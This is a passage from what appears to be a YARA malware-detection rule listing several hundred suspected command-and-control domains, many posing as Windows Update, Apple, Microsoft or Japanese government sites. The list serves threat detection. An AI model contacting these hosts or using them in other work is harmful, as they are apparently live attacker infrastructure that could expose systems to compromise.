$c2_417 = \"ftp.windowsupdate.authorizeddns.us\" ascii\n        $c2_418 = \"ftp.windowsupdate.dns05.com\" ascii\n        $c2_419 = \"ftp.windowsupdate.esmtp.biz\" ascii\n        $c2_420 = \"ftp.windowsupdate.ezua.com\" ascii\n        $c2_421 = \"ftp.windowsupdate.fartit.com\" ascii\n        $c2_422 = \"ftp.windowsupdate.gettrials.com\" ascii\n        $c2_423 = \"ftp.windowsupdate.instanthq.com\" ascii\n        $c2_424 = \"ftp.windowsupdate.jungleheart.com\" ascii\n        $c2_425 = \"ftp.windowsupdate.lflink.com\" ascii\n        $c2_426 = \"ftp.windowsupdate.mrface.com\" ascii\n        $c2_427 = \"ftp.windowsupdate.mylftv.com\" ascii\n        $c2_428 = \"ftp.windowsupdate.rebatesrule.net\" ascii\n        $c2_429 = \"ftp.windowsupdate.sellclassics.com\" ascii\n        $c2_430 = \"ftp.windowsupdate.serveusers.com\" ascii\n        $c2_431 = \"ftp.yandexr.sellclassics.com\" ascii\n        $c2_432 = \"fu.epac.to\" ascii\n        $c2_433 = \"fuck.ikwb.com\" ascii\n        $c2_434 = \"fuckanti.com\" ascii\n        $c2_435 = \"fuckdd.8800.org\" ascii\n        $c2_436 = \"fuckmm.8800.org\" ascii\n        $c2_437 = \"fuckmm.dns-dns.com\" ascii\n        $c2_438 = \"fukuoka.cloud-maste.com\" ascii\n        $c2_439 = \"g3ypf.online\" ascii\n        $c2_440 = \"gadskysun.com\" ascii\n        $c2_441 = \"gavin.ccfchrist.com\" ascii\n        $c2_442 = \"generat.almostmy.com\" ascii\n        $c2_443 = \"generousd.hopto.org\" ascii\n        $c2_444 = \"gensuzuki.6600.org\" ascii\n        $c2_445 = \"getfond.info\" ascii\n        $c2_446 = \"gh.mysecondarydns.com\" ascii\n        $c2_447 = \"gifuonlineshopping.mynumber.org\" ascii\n        $c2_448 = \"glicense.shenajou.com\" ascii\n        $c2_449 = \"globalnews.wikaba.com\" ascii\n        $c2_450 = \"gmail.com.mailsserver.com\" ascii\n        $c2_451 = \"gmpcw.com\" ascii\n        $c2_452 = \"gold.polopurple.com\" ascii\n        $c2_453 = \"goldtoyota.com\" ascii\n        $c2_454 = \"goodmusic.justdied.com\" ascii\n        $c2_455 = \"goodsampjp.com\" ascii\n        $c2_456 = \"gooesdataios.instanthq.com\" ascii\n        $c2_457 = \"google.macforlinux.net\" ascii\n        $c2_458 = \"google.usrobothome.com\" ascii\n        $c2_459 = \"googlemeail.com\" ascii\n        $c2_460 = \"gostudyantivirus.com\" ascii\n        $c2_461 = \"gostudymbaa.com\" ascii\n        $c2_462 = \"gotourisma.com\" ascii\n        $c2_463 = \"gt4study.com\" ascii\n        $c2_464 = \"gtsofta.com\" ascii\n        $c2_465 = \"haoyujd.info\" ascii\n        $c2_466 = \"happy.workerisgood.com\" ascii\n        $c2_467 = \"have8000.com\" ascii\n        $c2_468 = \"helpus.ddns.info\" ascii\n        $c2_469 = \"helshellfucde.8866.org\" ascii\n        $c2_470 = \"hg8fmv.racing\" ascii\n        $c2_471 = \"hii.qhigh.com\" ascii\n        $c2_472 = \"hk.2012yearleft.com\" ascii\n        $c2_473 = \"hk.cmdnetview.com\" ascii\n        $c2_474 = \"hk.have8000.com\" ascii\n        $c2_475 = \"hk.loveddos.com\" ascii\n        $c2_476 = \"home.trickip.org\" ascii\n        $c2_477 = \"hostport9.net\" ascii\n        $c2_478 = \"hotmai.info\" ascii\n        $c2_479 = \"hotmail.com.mailsserver.com\" ascii\n        $c2_480 = \"hukuoka.cloud-maste.com\" ascii\n        $c2_481 = \"iamges.itunesmusic.jkub.com\" ascii\n        $c2_482 = \"ibmmsg.strangled.net\" ascii\n        $c2_483 = \"icfeds.cf\" ascii\n        $c2_484 = \"idpmus.hostport9.net\" ascii\n        $c2_486 = \"im.suibian2010.info\" ascii\n        $c2_487 = \"image.websago.info\" ascii\n        $c2_488 = \"images.itunesmusic.jkub.com\" ascii\n        $c2_489 = \"images.thedomais.info\" ascii\n        $c2_490 = \"images.tyoto-go-jp.com\" ascii\n        $c2_491 = \"images.windowsupdate.organiccrap.com\" ascii\n        $c2_492 = \"imap.architectisusa.com\" ascii\n        $c2_493 = \"imap.dnset.com\" ascii\n        $c2_494 = \"imap.lflink.com\" ascii\n        $c2_495 = \"imap.onmypc.net\" ascii\n        $c2_496 = \"imap.ygto.com\" ascii\n        $c2_497 = \"img.station155.com\" ascii\n        $c2_498 = \"improvejpese.com\" ascii\n        $c2_499 = \"incloud-go.com\" ascii\n        $c2_500 = \"incloud-obert.com\" ascii\n        $c2_501 = \"ingemar.catholicmmb.com\" ascii\n        $c2_502 = \"innocent-isayev.sexidude.com\" ascii\n        $c2_503 = \"innov-tec.com.ua\" ascii\n        $c2_504 = \"inspgon.re26.com\" ascii\n        $c2_505 = \"interpreter.shenajou.com\" ascii\n        $c2_506 = \"invoices.sexxxy.biz\" ascii\n        $c2_508 = \"iphone.vizvaz.com\" ascii\n        $c2_509 = \"ipv4.applemusic.itemdb.com\" ascii\n        $c2_510 = \"ipv4.itunesmusic.jkub.com\" ascii\n        $c2_511 = \"ipv4.japanenvnews.qpoe.com\" ascii\n        $c2_512 = \"ipv4.microsoftmusic.onedumb.com\" ascii\n        $c2_513 = \"ipv4.microsoftupdate.mrbasic.com\" ascii\n        $c2_514 = \"ipv4.microsoftupdate.qhigh.com\" ascii\n        $c2_515 = \"ipv4.windowsupdate.3-a.net\" ascii\n        $c2_516 = \"ipv4.windowsupdate.authorizeddns.org\" ascii\n        $c2_517 = \"ipv4.windowsupdate.authorizeddns.us\" ascii\n        $c2_518 = \"ipv4.windowsupdate.dnset.com\" ascii\n        $c2_519 = \"ipv4.windowsupdate.esmtp.biz\" ascii\n        $c2_520 = \"ipv4.windowsupdate.ezua.com\" ascii\n        $c2_521 = \"ipv4.windowsupdate.fartit.com\" ascii\n        $c2_522 = \"ipv4.windowsupdate.gettrials.com\" ascii\n        $c2_523 = \"ipv4.windowsupdate.itsaol.com\" ascii\n        $c2_524 = \"ipv4.windowsupdate.lflink.com\" ascii\n        $c2_525 = \"ipv4.windowsupdate.lflinkup.com\" ascii\n        $c2_526 = \"ipv4.windowsupdate.mrface.com\" ascii\n        $c2_527 = \"ipv4.windowsupdate.mylftv.com\" ascii\n        $c2_528 = \"ipv4.windowsupdate.nsatcdns.com\" ascii\n        $c2_529 = \"ipv4.windowsupdate.x24hr.com\" ascii\n        $c2_530 = \"ipv6microsoft.dlmix.ourdvs.com\" ascii\n        $c2_531 = \"itlans.isasecret.com\" ascii\n        $c2_532 = \"itunesdownload.jkub.com\" ascii\n        $c2_533 = \"itunesdownload.vizvaz.com\" ascii\n        $c2_534 = \"itunesdownload.wikaba.com\" ascii\n        $c2_535 = \"itunesimages.itemdb.com\" ascii\n        $c2_536 = \"itunesimages.itsaol.com\" ascii\n        $c2_537 = \"itunesimages.qpoe.com\" ascii\n        $c2_538 = \"itunesmirror.fartit.com\" ascii\n        $c2_539 = \"itunesmirror.itsaol.com\" ascii\n        $c2_540 = \"itunesmusic.ikwb.com\" ascii\n        $c2_541 = \"itunesmusic.jetos.com\" ascii\n        $c2_542 = \"itunesmusic.jkub.com\" ascii\n        $c2_543 = \"itunesmusic.zzux.com\" ascii\n        $c2_544 = \"itunesupdate.itsaol.com\" ascii\n        $c2_545 = \"itunesupdates.organiccrap.com\" ascii\n        $c2_546 = \"iw.mrslove.com\" ascii\n        $c2_547 = \"ixrayeye.com\" ascii\n        $c2_548 = \"james.tffghelth.com\" ascii\n        $c2_549 = \"janpan.bigmoney.biz\" ascii\n        $c2_550 = \"janpun.americanunfinished.com\" ascii\n        $c2_551 = \"jap.japanmusicinfo.com\" ascii\n        $c2_552 = \"japan.fuckanti.com\" ascii\n        $c2_553 = \"japan.linuxforover.com\" ascii\n        $c2_554 = \"japan.loveddos.com\" ascii\n        $c2_555 = \"japanenvnews.qpoe.com\" ascii\n        $c2_556 = \"japanfilmsite.ikwb.com\" ascii\n        $c2_557 = \"japanfst.japanteam.org\" ascii\n        $c2_558 = \"japanmusicinfo.com\" ascii\n        $c2_559 = \"japanteam.org\" ascii\n        $c2_560 = \"jcie.mofa.ns01.info\" ascii\n        $c2_561 = \"jepsen.r3u8.com\" ascii\n        $c2_562 = \"jica-go-jp.bike\" ascii\n        $c2_563 = \"jica-go-jp.biz\" ascii\n        $c2_564 = \"jimin-jp.biz\" ascii\n        $c2_565 = \"jimin.jimindaddy.com\" ascii\n        $c2_566 = \"jimin.mymom.info\" ascii\n        $c2_567 = \"jimindaddy.com\" ascii\n        $c2_568 = \"jimingroup.com\" ascii\n        $c2_569 = \"jimintokoy.com\" ascii\n        $c2_570 = \"jj.mysecondarydns.com\" ascii\n        $c2_571 = \"jmuroran.com\" ascii\n        $c2_572 = \"jp.rakutenmusic.com\" ascii\n        $c2_573 = \"jp.serveuser.com\" ascii\n        $c2_574 = \"jpcert.org\" ascii\n        $c2_575 = \"jpn.longmusic.com\" ascii\n        $c2_576 = \"jpnxzshopdata.authorizeddns.org\" ascii\n        $c2_577 = \"jpstarmarket.serveusers.com\" ascii\n        $c2_578 = \"kaka.lehigtapp.com\" ascii\n        $c2_579 = \"kawasaki.cloud-maste.com\" ascii\n        $c2_580 = \"kawasaki.unhamj.com\" ascii\n        $c2_581 = \"kennedy.tffghelth.com\" ascii\n        $c2_582 = \"key.zzux.com\" ascii\n        $c2_583 = \"kikimusic.sellclassics.com\" ascii\n        $c2_584 = \"kmd.crabdance.com\" ascii\n        $c2_585 = \"knowledge.sellclassics.com\" ascii\n        $c2_586 = \"ktgmktanxgvn.r3u8.com\" ascii\n        $c2_587 = \"kxsbwappupdate.dhcp.biz\" ascii\n        $c2_588 = \"kztmusiclnk.dnsrd.com\" ascii\n        $c2_589 = \"lan.dynssl.com\" ascii\n        $c2_590 = \"last.p6p6.net\" ascii\n        $c2_591 = \"latestnews.epac.to\" ascii\n        $c2_592 = \"latestnews.organiccrap.com\" ascii\n        $c2_593 = \"leedong.longmusic.com\" ascii\n        $c2_594 = \"lehigtapp.com\" ascii\n        $c2_595 = \"lennon.fftpoor.com\" ascii\n        $c2_596 = \"license.shenajou.com\" ascii\n        $c2_597 = \"lie.jetos.com\" ascii\n        $c2_598 = \"linuxforover.com\" ascii\n        $c2_599 = \"linuxsofta.com\" ascii\n        $c2_600 = \"lion.wchildress.com\" ascii\n        $c2_601 = \"lizard.poulsenv.com\" ascii\n        $c2_602 = \"logon-live.com\" ascii\n        $c2_603 = \"lottedfstravel.webbooting.com\" ascii\n        $c2_604 = \"loveddos.com\" ascii\n        $c2_605 = \"lzf550.r3u8.com\" ascii\n        $c2_606 = \"ma.vizvaz.com\" ascii\n        $c2_607 = \"mac.goldtoyota.com\" ascii\n        $c2_608 = \"mac.methoder.com\" ascii\n        $c2_609 = \"macfee.mrface.com\" ascii\n        $c2_610 = \"macforlinux.net\" ascii\n        $c2_611 = \"maffc.mrface.com\" ascii\n        $c2_612 = \"mail.architectisusa.com\" ascii\n        $c2_613 = \"mail.macforlinux.net\" ascii\n        $c2_614 = \"mailcarriage.co.uk\" ascii\n        $c2_615 = \"mailj.hostport9.net\" ascii\n        $c2_616 = \"mailserever.com\" ascii\n        $c2_617 = \"mailsserver.com\" ascii\n        $c2_618 = \"mailvserver.com\" ascii\n        $c2_619 = \"malcolm.fftpoor.com\" ascii\n        $c2_620 = \"malware.dsmtp.com\" ascii\n        $c2_621 = \"manager.architectisusa.com\" ascii\n        $c2_622 = \"manager.jetos.com\" ascii\n        $c2_623 = \"markabcinfo.dynamicdns.me.uk\" ascii\n        $c2_624 = \"martin.sellclassics.com\" ascii\n        $c2_625 = \"mason.vizvaz.com\" ascii\n        $c2_626 = \"mbaby.macforlinux.net\" ascii\n        $c2_627 = \"medexplor.thedomais.info\" ascii\n        $c2_628 = \"mediapath.organiccrap.com\" ascii\n        $c2_629 = \"meiji-ac-jp.com\" ascii\n        $c2_630 = \"mesjm.emailfound.info\" ascii\n        $c2_631 = \"message.emailfound.info\" ascii\n        $c2_632 = \"message.p6p6.net\" ascii\n        $c2_633 = \"messagea.emailfound.info\" ascii\n        $c2_634 = \"methoder.com\" ascii\n        $c2_635 = \"mf.ddns.info\" ascii\n        $c2_636 = \"microcnmlgb.3322.org\" ascii\n        $c2_637 = \"microdef.2288.org\" ascii\n        $c2_638 = \"microhome.wikaba.com\" ascii\n        $c2_639 = \"microsoft.got-game.org\" ascii\n        $c2_640 = \"microsoft.mrface.com\" ascii\n        $c2_641 = \"microsoftdownload.zzux.com\" ascii\n        $c2_642 = \"microsoftempowering.sendsmtp.com\" ascii\n        $c2_643 = \"microsoften.com\" ascii\n        $c2_644 = \"microsoftgame.mrface.com\" ascii\n        $c2_645 = \"microsoftgetstarted.sexidude.com\" ascii\n        $c2_646 = \"microsoftimages.organiccrap.com\" ascii\n        $c2_647 = \"microsoftmirror.mrbasic.com\" ascii\n        $c2_648 = \"microsoftmusic.itemdb.com\" ascii\n        $c2_649 = \"microsoftmusic.mrbasic.com\" ascii\n        $c2_650 = \"microsoftmusic.onedumb.com\" ascii\n        $c2_651 = \"microsoftqckmanager.pcanywhere.net\" ascii\n        $c2_652 = \"microsoftstore.jetos.com\" ascii\n        $c2_653 = \"microsoftstores.itemdb.com\" ascii\n        $c2_654 = \"microsoftupdate.mrbasic.com\" ascii\n        $c2_655 = \"microsoftupdate.qhigh.com\" ascii\n        $c2_656 = \"microsoftupdates.vizvaz.com\" ascii\n        $c2_657 = \"micrsoftware.dsmtp.com\" ascii\n        $c2_658 = \"mircsoft.compress.to\" ascii\n        $c2_659 = \"mivsee.website0012.net\" ascii\n        $c2_660 = \"mmofoojap.2288.org\" ascii\n        $c2_661 = \"mmy.ddns.us\" ascii\n        $c2_662 = \"mobile.2waky.com\" ascii\n        $c2_663 = \"mocha.100fanwen.com\" ascii\n        $c2_664 = \"mod.jetos.com\" ascii\n        $c2_665 = \"mofa-go-jp.com\" ascii\n        $c2_666 = \"mofa.dynamic-dns.net\" ascii\n        $c2_667 = \"mofa.ns01.info\" ascii\n        $c2_668 = \"mofa.strangled.net\" ascii\n        $c2_669 = \"mofaess.com\" ascii\n        $c2_670 = \"mongoles.3322.org\" ascii\n        $c2_671 = \"monkey.2012yearleft.com\" ascii\n        $c2_672 = \"moscowstdsupdate.toythieves.com\" ascii\n        $c2_673 = \"mrsloveaqx.mrslove.com\" ascii\n        $c2_674 = \"ms.ecc.u-tokyo-ac-jp.com\" ascii\n        $c2_675 = \"mseupdate.ourhobby.com\" ascii\n        $c2_676 = \"msg.ezua.com\" ascii\n        $c2_677 = \"msn.incloud-go.com\" ascii\n        $c2_678 = \"muller.exprenum.com\" ascii\n        $c2_679 = \"music.applemusic.itemdb.com\" ascii\n        $c2_680 = \"music.cleansite.us\" ascii\n        $c2_681 = \"music.websegoo.net\" ascii\n        $c2_682 = \"musicfile.ikwb.com\" ascii\n        $c2_683 = \"musicinfo.everydayfilmlink.com\" ascii\n        $c2_684 = \"musiclinker.jkub.com\" ascii\n        $c2_685 = \"musicsecph.squirly.info\" ascii\n        $c2_686 = \"mx.yetrula.eu\" ascii\n        $c2_687 = \"myie12.com\" ascii\n        $c2_688 = \"mymusicbox.lflinkup.org\" ascii\n        $c2_689 = \"mymusicbox.vizvaz.com\" ascii\n        $c2_690 = \"myphpwebsite.itsaol.com\" ascii\n        $c2_691 = \"myrestroomimage.isasecret.com\" ascii\n        $c2_692 = \"mytwhomeinst.sendsmtp.com\" ascii\n        $c2_693 = \"myurinikoreaaps.ninth.biz\" ascii\n        $c2_694 = \"na.americanunfinished.com\" ascii\n        $c2_695 = \"na.onmypc.org\" ascii\n        $c2_696 = \"nasa.xxuz.com\" ascii\n        $c2_697 = \"nec.website0012.net\" ascii\n        $c2_698 = \"news.100fanwen.com\" ascii\n        $c2_699 = \"newsdata.jkub.com\" ascii\n        $c2_700 = \"newsfile.toythieves.com\" ascii\n        $c2_701 = \"newsreport.justdied.com\" ascii\n        $c2_702 = \"newsroom.cleansite.info\" ascii\n        $c2_703 = \"nezwq.ezua.com\" ascii\n        $c2_704 = \"ngcc.8800.org\" ascii\n        $c2_705 = \"niushenghuo.info\" ascii\n        $c2_706 = \"nk10.belowto.com\" ascii\n        $c2_707 = \"nk20.belowto.com\" ascii\n        $c2_708 = \"nlddnsinfo.https443.org\" ascii\n        $c2_709 = \"nmrx.mrbonus.com\" ascii\n        $c2_710 = \"nn.dynssl.com\" ascii\n        $c2_711 = \"no.authorizeddns.org\" ascii\n        $c2_712 = \"node.mofaess.com\" ascii\n        $c2_713 = \"nodns2.qipian.org\" ascii\n        $c2_714 = \"nposnewsinfo.qhigh.com\" ascii\n        $c2_715 = \"ns1.belowto.com\" ascii\n        $c2_716 = \"ns1.tlchs2.ml\" ascii\n        $c2_717 = \"ns2.belowto.com\" ascii\n        $c2_718 = \"ns21.belowto.com\" ascii\n        $c2_719 = \"ns22.belowto.com\" ascii\n        $c2_720 = \"ns4.belowto.com\" ascii\n        $c2_721 = \"ns5.belowto.com\" ascii\n        $c2_722 = \"nsa.mefound.com\" ascii\n        $c2_723 = \"nsatcdns.com\" ascii\n        $c2_724 = \"nt.mynumber.org\" ascii\n        $c2_725 = \"nttdata.otzo.com\" ascii\n        $c2_726 = \"nunluck.re26.com\" ascii\n        $c2_727 = \"nz.compress.to\" ascii\n        $c2_728 = \"oipbl.com\" ascii\n        $c2_729 = \"ol.almostmy.com\" ascii\n        $c2_730 = \"oldbmwy.com\" ascii\n        $c2_731 = \"oms.sindeali.com\" ascii\n        $c2_732 = \"openmofa.8866.org\" ascii\n        $c2_733 = \"oracleupdate.dns04.com\" ascii\n        $c2_734 = \"osaka-jpgo.com\" ascii\n        $c2_735 = \"outlook.otzo.com\" ascii\n        $c2_736 = \"owlmedia.mefound.com\" ascii\n        $c2_737 = \"p6p6.net\" ascii\n        $c2_738 = \"peopleinfodata.3-a.net\" ascii\n        $c2_739 = \"phptecinfohelp.itemdb.com\" ascii\n        $c2_740 = \"pictures.everydayfilmlink.com\" ascii\n        $c2_741 = \"pj.qpoe.com\" ascii\n        $c2_742 = \"points.mofaess.com\" ascii\n        $c2_743 = \"polopurple.com\" ascii\n        $c2_744 = \"pop.architectisusa.com\" ascii\n        $c2_745 = \"pop.loveddos.com\" ascii\n        $c2_746 = \"portal.mrface.com\" ascii\n        $c2_747 = \"portal.sendsmtp.com\" ascii\n        $c2_748 = \"portalser.dynamic-dns.net\" ascii\n        $c2_749 = \"poulsenv.com\" ascii\n        $c2_750 = \"praskovya-matveyeva.mefound.com\" ascii\n        $c2_751 = \"praskovya-ulyanova.dumb1.com\" ascii\n        $c2_752 = \"premium.redforlinux.com\" ascii\n        $c2_753 = \"products.almostmy.com\" ascii\n        $c2_754 = \"products.cleansite.us\" ascii\n        $c2_755 = \"products.serveuser.com\" ascii\n        $c2_756 = \"program.acmetoy.com\" ascii\n        $c2_757 = \"prrmes4019.r3u8.com\" ascii\n        $c2_758 = \"purchase.lflinkup.org\" ascii\n        $c2_759 = \"q6.niushenghuo.info\" ascii\n        $c2_760 = \"qtsofta.com\" ascii\n        $c2_761 = \"quick.oldbmwy.com\" ascii\n        $c2_762 = \"r3u8.com\" ascii\n        $c2_763 = \"radiorig.com\" ascii\n        $c2_764 = \"rain.orctldl.windowsupdate.authorizeddns.us\" ascii\n        $c2_765 = \"rakutenmusic.com\" ascii\n        $c2_766 = \"rdns-4.infoproduto1.tk\" ascii\n        $c2_767 = \"re26.com\" ascii\n        $c2_768 = \"read.xxuz.com\" ascii\n        $c2_769 = \"recent.dns-stuff.com\" ascii\n        $c2_770 = \"recent.fartit.com\" ascii\n        $c2_771 = \"record.hostport9.net\" ascii\n        $c2_772 = \"record.webssl9.info\" ascii\n        $c2_773 = \"record.wschandler.com\" ascii\n        $c2_774 = \"redforlinux.com\" ascii\n        $c2_775 = \"referred.gr8domain.biz\" ascii\n        $c2_776 = \"referred.yourtrap.com\" ascii\n        $c2_777 = \"register.ourhobby.com\" ascii\n        $c2_778 = \"registration2.instanthq.com\" ascii\n        $c2_779 = \"registrations.4pu.com\" ascii\n        $c2_780 = \"registrations.organiccrap.com\" ascii\n        $c2_781 = \"reports.tomorrowforgood.com\" ascii\n        $c2_782 = \"reserveds.onedumb.com\" ascii\n        $c2_783 = \"resources.applemusic.itemdb.com\" ascii\n        $c2_784 = \"rethem.almostmy.com\" ascii\n        $c2_785 = \"rg197.win\" ascii\n        $c2_786 = \"rlbeiydn.hi.r3u8.com\" ascii\n        $c2_787 = \"saiyo.exprenum.com\" ascii\n        $c2_788 = \"sakai.unhamj.com\" ascii\n        $c2_789 = \"salvaiona.com\" ascii\n        $c2_790 = \"sappore.cloud-maste.com\" ascii\n        $c2_791 = \"sapporo.cloud-maste.com\" ascii\n        $c2_792 = \"sapporot.com\" ascii\n        $c2_793 = \"sat.suayay.com\" ascii\n        $c2_794 = \"saverd.re26.com\" ascii\n        $c2_795 = \"sbuudd.webssl9.info\" ascii\n        $c2_796 = \"sc.weboot.info\" ascii\n        $c2_797 = \"scholz-versand.com\" ascii\n        $c2_798 = \"scorpion.poulsenv.com\" ascii\n        $c2_799 = \"scrlk.exprenum.com\" ascii\n        $c2_800 = \"sdmsg.onmypc.org\" ascii\n        $c2_801 = \"se.toythieves.com\" ascii\n        $c2_802 = \"sea.websegoo.net\" ascii\n        $c2_803 = \"secertnews.mrbasic.com\" ascii\n        $c2_804 = \"secmicrosooo.6600.org\" ascii\n        $c2_805 = \"secnetshit.com\" ascii\n        $c2_806 = \"secserverupdate.toh.info\" ascii\n        $c2_807 = \"sell.mofaess.com\" ascii\n        $c2_808 = \"sema.linuxsofta.com\" ascii\n        $c2_809 = \"send.have8000.com\" ascii\n        $c2_810 = \"send.mofa.ns01.info\" ascii\n        $c2_811 = \"sendmsg.jumpingcrab.com\" ascii\n        $c2_812 = \"senseye.ikwb.com\" ascii\n        $c2_813 = \"senseye.mrbonus.com\" ascii\n        $c2_814 = \"septdlluckysystem.jungleheart.com\" ascii\n        $c2_815 = \"seraphim-yurieva.justdied.com\" ascii\n        $c2_816 = \"serv.justdied.com\" ascii\n        $c2_817 = \"server1.proxydns.com\" ascii\n        $c2_818 = \"seyesb.acmetoy.com\" ascii\n        $c2_819 = \"sha.25u.com\" ascii\n        $c2_820 = \"sha.ikwb.com\" ascii\n        $c2_821 = \"shenajou.com\" ascii\n        $c2_822 = \"shoppingcentre.station155.com\" ascii\n        $c2_823 = \"shrimp.UsFfUnicef.com\" ascii\n        $c2_824 = \"shrimp.bdoncloud.com\" ascii\n        $c2_825 = \"shugiin.jkub.com\" ascii\n        $c2_826 = \"sindeali.com\" ascii\n        $c2_827 = \"singed.otzo.com\" ascii\n        $c2_828 = \"siteinit.info\" ascii\n        $c2_829 = \"sky.oldbmwy.com\" ascii\n        $c2_830 = \"sma.jimindaddy.com\" ascii\n        $c2_831 = \"smo.gadskysun.com\" ascii\n        $c2_832 = \"smtp.architectisusa.com\" ascii\n        $c2_833 = \"smtp.macforlinux.net\" ascii\n        $c2_834 = \"smtp230.toldweb.com\" ascii\n        $c2_835 = \"somthing.re26.com\" ascii\n        $c2_836 = \"sstday.jkub.com\" ascii\n        $c2_837 = \"start.usrobothome.com\" ascii\n        $c2_838 = \"station155.com\" ascii\n        $c2_839 = \"stevenlf.com\" ascii\n        $c2_840 = \"stone.jumpingcrab.com\" ascii\n        $c2_841 = \"style.u-tokyo-ac-jp.com\" ascii\n        $c2_842 = \"suayay.com\" ascii\n        $c2_843 = \"suibian2010.info\" ascii\n        $c2_844 = \"support1.mrface.com\" ascii\n        $c2_845 = \"supportus.mefound.com\" ascii\n        $c2_846 = \"suzukigooogle.8866.org\" ascii\n        $c2_847 = \"svc.dynssl.com\" ascii\n        $c2_848 = \"synssl.dnset.com\" ascii\n        $c2_849 = \"sz.thedomais.info\" ascii\n        $c2_850 = \"taipei.yourtrap.com\" ascii\n        $c2_851 = \"taipeifoodsite.ocry.com\" ascii\n        $c2_852 = \"tamraj.fartit.com\" ascii\n        $c2_853 = \"telegraph.mefound.com\" ascii\n        $c2_854 = \"test.usyahooapis.com\" ascii\n        $c2_855 = \"tfa.longmusic.com\" ascii\n        $c2_856 = \"tffghelth.com\" ascii\n        $c2_857 = \"thedomais.info\" ascii\n        $c2_858 = \"ticket.instanthq.com\" ascii\n        $c2_859 = \"ticket.jetos.com\" ascii\n        $c2_860 = \"ticket.serveuser.com\" ascii\n        $c2_861 = \"tidatacenter.shenajou.com\" ascii\n        $c2_862 = \"tisdatacenter.shenajou.com\" ascii\n        $c2_863 = \"tisupdateinfo.faqserv.com\" ascii\n        $c2_864 = \"tokyo-gojp.com\" ascii\n        $c2_865 = \"tokyofile.2waky.com\" ascii\n        $c2_866 = \"tomorrowforgood.com\" ascii\n        $c2_867 = \"tophost.dynamicdns.co.uk\" ascii\n        $c2_868 = \"toshste.com\" ascii\n        $c2_869 = \"toya.7766.org\" ascii\n        $c2_870 = \"transfer.lflinkup.org\" ascii\n        $c2_871 = \"transfer.mrbasic.com\" ascii\n        $c2_872 = \"transfer.vizvaz.com\" ascii\n        $c2_873 = \"trasul.mypicture.info\" ascii\n        $c2_874 = \"travelyokogawafz.fartit.com\" ascii\n        $c2_875 = \"trendmicroupdate.shenajou.com\" ascii\n        $c2_876 = \"trendsecurity.shenajou.com\" ascii\n        $c2_877 = \"trout.belowto.com\" ascii\n        $c2_878 = \"tv.goldtoyota.com\" ascii\n        $c2_879 = \"tw.2012yearleft.com\" ascii\n        $c2_880 = \"twmusic.proxydns.com\" ascii\n        $c2_881 = \"twpeoplemusicsite.my03.com\" ascii\n        $c2_882 = \"twtravelinfomation.toythieves.com\" ascii\n        $c2_883 = \"twx.mynumber.org\" ascii\n        $c2_884 = \"tyoto-go-jp.com\" ascii\n        $c2_885 = \"u-tokyo-ac-jp.com\" ascii\n        $c2_886 = \"u1.FartIT.com\" ascii\n        $c2_887 = \"u1.haoyujd.info\" ascii\n        $c2_888 = \"ubuntusofta.com\" ascii\n        $c2_889 = \"ugreen.itemdb.com\" ascii\n        $c2_890 = \"ui.hdcdui.com\" ascii\n        $c2_891 = \"uk.dynamicdns.org.uk\" ascii\n        $c2_892 = \"ukuoka.cloud-maste.com\" ascii\n        $c2_893 = \"ultimedia.vmmini.com\" ascii\n        $c2_894 = \"un.ddns.info\" ascii\n        $c2_895 = \"un.dnsrd.com\" ascii\n        $c2_896 = \"unhamj.com\" ascii\n        $c2_897 = \"update.yourtrap.com\" ascii\n        $c2_898 = \"updatemirrors.fartit.com\" ascii\n        $c2_899 = \"updates.itsaol.com\" ascii\n        $c2_900 = \"ups.improvejpese.com\" ascii\n        $c2_901 = \"urearapetsu.com\" ascii\n        $c2_902 = \"usa.got-game.org\" ascii\n        $c2_903 = \"usa.itsaol.com\" ascii\n        $c2_904 = \"usa.japanteam.org\" ascii\n        $c2_905 = \"usffunicef.com\" ascii\n        $c2_906 = \"usmirocomney.net\" ascii\n        $c2_907 = \"usrobothome.com\" ascii\n        $c2_908 = \"usyahooapis.com\" ascii\n        $c2_909 = \"uu.logon-live.com\" ascii\n        $c2_910 = \"uu.niushenghuo.info\" ascii\n        $c2_911 = \"ux.niushenghuo.info\" ascii\n        $c2_912 = \"v4.appledownload.ourhobby.com\" ascii\n        $c2_913 = \"v4.itunesmusic.jkub.com\" ascii\n        $c2_914 = \"v4.microsoftmusic.onedumb.com\" ascii\n        $c2_915 = \"v4.microsoftupdate.mrbasic.com\" ascii\n        $c2_916 = \"v4.windowsupdate.DEDGESUITE.NET\" ascii\n        $c2_917 = \"v4.windowsupdate.authorizeddns.org\" ascii\n        $c2_918 = \"v4.windowsupdate.dnset.com\" ascii\n        $c2_919 = \"v4.windowsupdate.itsaol.com\" ascii\n        $c2_920 = \"v4.windowsupdate.lflinkup.com\" ascii\n        $c2_921 = \"v4.windowsupdate.mrface.com\" ascii\n        $c2_922 = \"v4.windowsupdate.nsatcdns.com\" ascii\n        $c2_923 = \"v4.windowsupdate.x24hr.com\" ascii\n        $c2_924 = \"v4.windowsupdates.dnsrd.com\" ascii\n        $c2_925 = \"veryhuai.info\" ascii\n        $c2_926 = \"video.vmdnsup.org\" ascii\n        $c2_927 = \"vmdnsup.org\" ascii\n        $c2_929 = \"vmyiersend.WEBSAGO.INFO\" ascii\n        $c2_930 = \"vmyisan.website0012.net\" ascii\n        $c2_932 = \"wchildress.com\" ascii\n        $c2_934 = \"wcxh.mynetav.net\" ascii\n        $c2_935 = \"wdsupdates.com\" ascii\n        $c2_936 = \"webbooting.com\" ascii\n        $c2_937 = \"webdirectnews.dynamicdns.biz\" ascii\n        $c2_938 = \"webinfoseco.ygto.com\" ascii\n        $c2_939 = \"webmailentry.jetos.com\" ascii\n        $c2_940 = \"weboot.info\" ascii\n        $c2_941 = \"websago.info\" ascii\n        $c2_942 = \"websegoo.net\" ascii\n        $c2_943 = \"website0012.net\" ascii\n        $c2_944 = \"websiteboo.website0012.net\" ascii\n        $c2_945 = \"websqlnewsmanager.ninth.biz\" ascii\n        $c2_946 = \"webssl9.info\" ascii\n        $c2_947 = \"well.itsaol.com\" ascii\n        $c2_948 = \"well.mrbasic.com\" ascii\n        $c2_949 = \"whale.toshste.com\" ascii\n        $c2_950 = \"whellbuy.wschandler.com\" ascii\n        $c2_951 = \"whyis.haoyujd.info\" ascii\n        $c2_952 = \"wike.wikaba.com\" ascii\n        $c2_953 = \"windowfile.itemdb.com\" ascii\n        $c2_954 = \"windowsimages.itemdb.com\" ascii\n        $c2_955 = \"windowsimages.qhigh.com\" ascii\n        $c2_956 = \"windowsmirrors.vizvaz.com\" ascii\n        $c2_957 = \"windowsstores.gettrials.com\" ascii\n        $c2_958 = 